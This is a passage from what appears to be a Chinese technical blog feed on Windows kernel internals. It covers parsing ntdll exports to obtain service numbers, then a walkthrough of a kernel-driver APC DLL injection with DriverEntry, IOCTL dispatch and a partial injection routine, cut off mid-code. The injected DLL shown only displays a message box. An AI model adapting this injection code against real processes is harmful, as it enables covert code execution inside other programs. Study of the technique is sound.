&#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (k &gt;= NumberOfServices)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不是WIN10_VERSION_10240版本，区别在于需要加上base-1得到Ordinals。上面直接用AddressOfNameOrdinals就行</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">AddressOfNameOrdinals = (USHORT*)((UINT8*)v1 + ImageExportDirectory-&gt;AddressOfNameOrdinals);</span><br><span class="line">Base = ImageExportDirectory-&gt;Base;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ImageExportDirectory-&gt;NumberOfFunctions; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            ServiceName = (<span class="type">char</span>*)((UINT8*)v1 + AddressOfNames[i]);</span><br><span class="line"></span><br><span class="line">            Ordinals = AddressOfNameOrdinals[i] + Base - <span class="number">1</span>;</span><br><span class="line">            ServiceAddress = (ULONG)((UINT8*)v1 + AddressOfFunctions[Ordinals]);</span><br><span class="line">            ......</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">GetNtServiceAddressInternal2</span><span class="params">(ULONG NumberOfServices)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PVOID v1 = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    IMAGE_DOS_HEADER* ImageDosHeader;</span><br><span class="line">    IMAGE_OPTIONAL_HEADER32* ImageOptionalHeader32;</span><br><span class="line">    IMAGE_EXPORT_DIRECTORY* ImageExportDirectory;</span><br><span class="line"></span><br><span class="line">    ULONG* AddressOfFunctions;</span><br><span class="line">    ULONG* AddressOfNames;</span><br><span class="line">    USHORT* AddressOfNameOrdinals;</span><br><span class="line"></span><br><span class="line">    ULONG Ordinals;</span><br><span class="line">    ULONG Base, i, ServiceAddress;</span><br><span class="line">    <span class="type">char</span>* ServiceName;</span><br><span class="line"></span><br><span class="line">    ULONG j = <span class="number">0</span>;</span><br><span class="line">    ULONG k = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        v1 = __NtdllImageBase;</span><br><span class="line">        <span class="keyword">if</span> (v1 == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        ImageDosHeader = (IMAGE_DOS_HEADER*)v1;</span><br><span class="line">        ImageOptionalHeader32 = (IMAGE_OPTIONAL_HEADER32*)((UINT8*)v1 + ImageDosHeader-&gt;e_lfanew + <span class="number">24</span>);</span><br><span class="line">        ImageExportDirectory = (IMAGE_EXPORT_DIRECTORY*)((UINT8*)v1 + ImageOptionalHeader32-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);</span><br><span class="line">        AddressOfFunctions = (ULONG*)((UINT8*)v1 + ImageExportDirectory-&gt;AddressOfFunctions);</span><br><span class="line">        AddressOfNames = (ULONG*)((UINT8*)v1 + ImageExportDirectory-&gt;AddressOfNames);</span><br><span class="line">        AddressOfNameOrdinals = (USHORT*)((UINT8*)v1 + ImageExportDirectory-&gt;AddressOfNameOrdinals);</span><br><span class="line"></span><br><span class="line">        Base = ImageExportDirectory-&gt;Base;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ImageExportDirectory-&gt;NumberOfFunctions; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            ServiceName = (<span class="type">char</span>*)((UINT8*)v1 + AddressOfNames[i]);</span><br><span class="line"></span><br><span class="line">            Ordinals = AddressOfNameOrdinals[i] + Base - <span class="number">1</span>;</span><br><span class="line">            ServiceAddress = (ULONG)((UINT8*)v1 + AddressOfFunctions[Ordinals]);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; NT_DLL_INFOS; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (__NtdllInfos[j].ServiceAddress == <span class="literal">NULL</span> &amp;&amp; __NtdllInfos[j].ServiceName != <span class="literal">NULL</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (_stricmp(ServiceName, __NtdllInfos[j].ServiceName) == <span class="number">0</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        __NtdllInfos[j].ServiceAddress = (PVOID)ServiceAddress;</span><br><span class="line">                        k++;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (k &gt;= NumberOfServices)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Ntos服务号、函数地址"><a href="#Ntos服务号、函数地址" class="headerlink" title="Ntos服务号、函数地址"></a>Ntos服务号、函数地址</h2><p><strong>用函数名的Unicode调MmGetSystemRoutineAddress获取函数地址</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ULONG __NtReadVirtualMemoryServiceIdentity = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> NTKERNELAPI <span class="title">BOOLEAN</span><span class="params">(*PFN_PSGETPROCESSEXITPROCESSCALLED)</span><span class="params">(PEPROCESS EProcess)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitializeNtosKernel</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    UNICODE_STRING v1;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__NtReadVirtualMemoryServiceIdentity == <span class="number">0</span>)</span><br><span class="line">        __NtReadVirtualMemoryServiceIdentity = <span class="built_in">GetNtServiceIdentity</span>((PVOID)__NtdllInfos[ZW_READ_VIRTUAL_MEMORY].ServiceAddress);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(&amp;v1, <span class="string">L&quot;PsGetProcessExitProcessCalled&quot;</span>);</span><br><span class="line">    __PsGetProcessExitProcessCalled = (PFN_PSGETPROCESSEXITPROCESSCALLED)<span class="built_in">MmGetSystemRoutineAddress</span>(&amp;v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>地址转服务号</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ULONG <span class="title">GetNtServiceIdentity</span><span class="params">(PVOID ServiceAddress)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PUCHAR v1;</span><br><span class="line">    ULONG ServiceIdentity;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ServiceAddress == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v1 = (PUCHAR)ServiceAddress;</span><br><span class="line">    <span class="keyword">if</span> (*v1 != (UCHAR)<span class="number">0xB8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ServiceIdentity = *(PULONG)(v1 + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">IS_VALID_ID</span>(ServiceIdentity))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ServiceIdentity;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Windows Kernel </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>APC注入</title>
      <link href="/2024/03/09/APC%E6%B3%A8%E5%85%A5/"/>
      <url>/2024/03/09/APC%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="APC注入"><a href="#APC注入" class="headerlink" title="APC注入"></a>APC注入</h1><h2 id="APC机制"><a href="#APC机制" class="headerlink" title="APC机制"></a>APC机制</h2><p>线程是不能被杀死 挂起和恢复的，线程在执行的时候自己占据着CPU，别人怎么可能控制他呢？举个极端的例子，如果不调用API，屏蔽中断，并保证代码不出现异常，线程将永久占据CPU。所以说线程如果想结束，一定是自己执行代码把自己杀死，不存在别人把线程结束的情况。</p><p>那如果想改变一个线程的行为该怎么办？可以给他提供一个函数，让他自己去调用，这个函数就是APC，即异步过程调用</p><p><img src="/.io//image-20240304230529013.png" alt="image-20240304230529013"></p><p>对于内核APC，APC函数的插入和执行并不是同一个线程，具体点说：在A线程中向B线程插入一个APC，插入的动作是在A线程中完成的，但什么时候执行则由B线程决定。所以叫异步过程调用。</p><p><strong>线程切换</strong>时，在<code>SwapContext</code>函数即将执行完成的时候，会判断当前是否有要执行的内核APC，接着将判断的结果存到eax，然后返回，接着找到上一层函数<code>KiSwapContext</code>函数，这个函数也没有对APC进行处理，而是继续返回，到父函数，会判断<code>KiSwapContext</code>的返回值，也就是判断当前是否有要处理的内核APC，如果有，则调用<code>KiDeliverApc</code>进行处理。</p><p><strong>系统调用</strong>中断或者异常(<code>_KiServiceExit</code>)，会判断是否有要执行的用户APC，如果有的话则会调用<code>KiDeliverApc</code>函数进行处理，此时<code>KiDeliverApc</code>第一个参数为1，代表执行用户APC和内核APC。当要执行用户APC之前，先要执行内核APC。</p><p>对于应用APC，当产生系统调用、中断或者异常，线程在返回用户空间前都会调用<code>_KiServiceExit</code>函数，在<code>_KiServiceExit</code>函数里会判断是否有要执行的用户APC，如果有则调用<code>KiDeliverApc</code>函数进行处理。</p><p>有用户APC要执行的话，就意味着线程要<strong>提前</strong>返回到用户空间去执行，而且返回的位置不是线程进入内核时的位置，而是返回到真正执行APC的位置每处理一个用户APC就会涉及到：<strong>内核—&gt;用户空间—&gt;再回到内核空间</strong>。进入内核前，当前上下文会被临时保存以待恢复。</p><h2 id="APC注入-1"><a href="#APC注入-1" class="headerlink" title="APC注入"></a>APC注入</h2><h3 id="dllmain"><a href="#dllmain" class="headerlink" title="dllmain"></a>dllmain</h3><p>注入的dll弹一个messageBox就行：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function"> )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, <span class="string">L&quot;Inject&quot;</span>, <span class="string">L&quot;Success&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="KAPC"><a href="#KAPC" class="headerlink" title="KAPC"></a>KAPC</h3><p>创建好设备对象和链接对象，设计派遣历程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegisterPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">UNREFERENCED_PARAMETER</span>(RegisterPath);</span><br><span class="line">NTSTATUS Status = STATUS_SUCCESS;</span><br><span class="line">PDEVICE_OBJECT  DeviceObject = <span class="literal">NULL</span>;</span><br><span class="line">UNICODE_STRING  DeviceObjectName;</span><br><span class="line">UNICODE_STRING  DeviceLinkName;</span><br><span class="line">ULONGi;</span><br><span class="line">DriverObject-&gt;DriverUnload = DriverUnload;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建设备对象名称</span></span><br><span class="line"><span class="built_in">RtlInitUnicodeString</span>(&amp;DeviceObjectName, DEVICE_OBJECT_NAME);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建设备对象</span></span><br><span class="line">Status = <span class="built_in">IoCreateDevice</span>(DriverObject, <span class="literal">NULL</span>,</span><br><span class="line">&amp;DeviceObjectName,</span><br><span class="line">FILE_DEVICE_UNKNOWN,</span><br><span class="line"><span class="number">0</span>, FALSE,</span><br><span class="line">&amp;DeviceObject);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建设备连接名称</span></span><br><span class="line"><span class="built_in">RtlInitUnicodeString</span>(&amp;DeviceLinkName, DEVICE_LINK_NAME);</span><br><span class="line"><span class="comment">//将设备连接名称与设备名称关联 </span></span><br><span class="line">Status = <span class="built_in">IoCreateSymbolicLink</span>(&amp;DeviceLinkName, &amp;DeviceObjectName);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">IoDeleteDevice</span>(DeviceObject);</span><br><span class="line"><span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//设计符合我们代码的派遣历程</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; IRP_MJ_MAXIMUM_FUNCTION; i++)</span><br><span class="line">&#123;</span><br><span class="line">DriverObject-&gt;MajorFunction[i] = PassThroughDispatch;   <span class="comment">//函数指针</span></span><br><span class="line">&#125;</span><br><span class="line">DriverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = ControlThroughDispatch;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="派遣例程"><a href="#派遣例程" class="headerlink" title="派遣例程"></a>派遣例程</h4><p>默认直接通过</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">PassThroughDispatch</span><span class="params">(PDEVICE_OBJECT  DeviceObject, PIRP Irp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Irp-&gt;IoStatus.Status = STATUS_SUCCESS;     <span class="comment">//LastError()</span></span><br><span class="line">Irp-&gt;IoStatus.Information = <span class="number">0</span>;             <span class="comment">//ReturnLength </span></span><br><span class="line"><span class="built_in">IoCompleteRequest</span>(Irp, IO_NO_INCREMENT);   <span class="comment">//将Irp返回给Io管理器</span></span><br><span class="line"><span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>IRP_MJ_DEVICE_CONTROL自定义</p><p>解析IRP堆栈内容，筛选IO控制码，CTL_APC_INJECTION就调用注入函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">ControlThroughDispatch</span><span class="params">(PDEVICE_OBJECT  DeviceObject, PIRP Irp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">NTSTATUS Status;</span><br><span class="line">ULONG_PTR Informaiton = <span class="number">0</span>;</span><br><span class="line">PVOID InputData = <span class="literal">NULL</span>;</span><br><span class="line">ULONG InputDataLength = <span class="number">0</span>;</span><br><span class="line">PVOID OutputData = <span class="literal">NULL</span>;</span><br><span class="line">ULONG OutputDataLength = <span class="number">0</span>;</span><br><span class="line">ULONG IoControlCode = <span class="number">0</span>;</span><br><span class="line">PEPROCESS EProcess = <span class="literal">NULL</span>;</span><br><span class="line">PIO_STACK_LOCATION  IoStackLocation = <span class="built_in">IoGetCurrentIrpStackLocation</span>(Irp);  <span class="comment">//Irp堆栈</span></span><br><span class="line">    </span><br><span class="line">IoControlCode = IoStackLocation-&gt;Parameters.DeviceIoControl.IoControlCode;</span><br><span class="line">InputData = Irp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">OutputData = Irp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">InputDataLength = IoStackLocation-&gt;Parameters.DeviceIoControl.InputBufferLength;</span><br><span class="line">OutputDataLength = IoStackLocation-&gt;Parameters.DeviceIoControl.OutputBufferLength;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">switch</span> (IoControlCode)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> CTL_APC_INJECTION:</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (InputDataLength &gt;= <span class="built_in">sizeof</span>(INJECTION_INFORMATION) &amp;&amp; InputData)</span><br><span class="line">Status = <span class="built_in">ApcInjectionPrepare</span>((PINJECTION_INFORMATION)InputData);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">Status = STATUS_INFO_LENGTH_MISMATCH;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">Irp-&gt;IoStatus.Status = Status;            <span class="comment">//Ring3 GetLastError();</span></span><br><span class="line">Irp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">IoCompleteRequest</span>(Irp, IO_NO_INCREMENT);  <span class="comment">//将Irp返回给Io管理器</span></span><br><span class="line"><span class="keyword">return</span> Status;                            <span class="comment">//Ring3 DeviceIoControl()返回值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="APC注入主函数"><a href="#APC注入主函数" class="headerlink" title="APC注入主函数"></a>APC注入主函数</h4><ol><li>PsLookupProcessByProcessId通过目标进程ID获取EProcess</li><li>PsGetProcessWow64Process返回值可以判断是不是Wow64进程。</li><li>KeWaitForSingleObject返回值判断是否是僵尸进程。如果是，解引用释放。</li><li>KeStackAttachProcess切换进程上下背景文。</li><li>自己实现的SeGetModuleBaseByModuleName从目标进程获取Ntdll模块基地址。这里会使用到是否是Wow64进程</li><li>自己实现的SeGetExportFunctionFromModule从目标模块获取LdrLoadDll导出函数。</li><li>初始化ShellCode</li><li>调用自己的ApcInjection开始进行注入。</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">ApcInjectionPrepare</span><span class="params">(IN PINJECTION_INFORMATION InjectionInfo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">NTSTATUS Status = STATUS_SUCCESS;</span><br><span class="line">NTSTATUS ThreadStatus = STATUS_SUCCESS;</span><br><span class="line">PEPROCESS EProcess = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">Status = <span class="built_in">PsLookupProcessByProcessId</span>((HANDLE)InjectionInfo-&gt;TargetProcessID, &amp;EProcess);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">&#123;</span><br><span class="line">KAPC_STATE Apc;</span><br><span class="line">UNICODE_STRING DllFullPath,NtdllFullPath;</span><br><span class="line"><span class="comment">//SET_PROCESS_PROTECTION Protection = &#123; 0 &#125;;</span></span><br><span class="line">PVOID NtdllModuleBase = <span class="literal">NULL</span>;</span><br><span class="line">PVOID LdrLoadDll = <span class="literal">NULL</span>;</span><br><span class="line">BOOLEAN IsWow64 = (<span class="built_in">PsGetProcessWow64Process</span>(EProcess) != <span class="literal">NULL</span>) ? TRUE : FALSE;</span><br><span class="line">LARGE_INTEGER Timeout = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 进程处于信号状态，中止任何操作</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">KeWaitForSingleObject</span>(EProcess, Executive, KernelMode, FALSE, &amp;Timeout) == STATUS_WAIT_0)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DbgPrint</span>(<span class="string">&quot;Process Is Terminating\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (EProcess)</span><br><span class="line"><span class="built_in">ObDereferenceObject</span>(EProcess);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> STATUS_PROCESS_IS_TERMINATING;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">KeStackAttachProcess</span>(EProcess, &amp;Apc);   <span class="comment">//切换进程上下背景文</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">RtlInitUnicodeString</span>(&amp;DllFullPath, InjectionInfo-&gt;DllFullPath);</span><br><span class="line"><span class="built_in">RtlInitUnicodeString</span>(&amp;NtdllFullPath, <span class="string">L&quot;Ntdll.dll&quot;</span>);</span><br><span class="line">NtdllModuleBase = <span class="built_in">SeGetModuleBaseByModuleName</span>(EProcess, &amp;NtdllFullPath, IsWow64);  <span class="comment">//目标进程中获取Ntdll 信息</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!NtdllModuleBase)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DbgPrint</span>(<span class="string">&quot;Failed To Get Ntdll Base\r\n&quot;</span>);</span><br><span class="line">Status = STATUS_NOT_FOUND;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取LdrLoadDll地址</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">&#123;</span><br><span class="line">LdrLoadDll = <span class="built_in">SeGetExportFunctionFromModule</span>(NtdllModuleBase, <span class="string">&quot;LdrLoadDll&quot;</span>, EProcess, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (!LdrLoadDll)</span><br><span 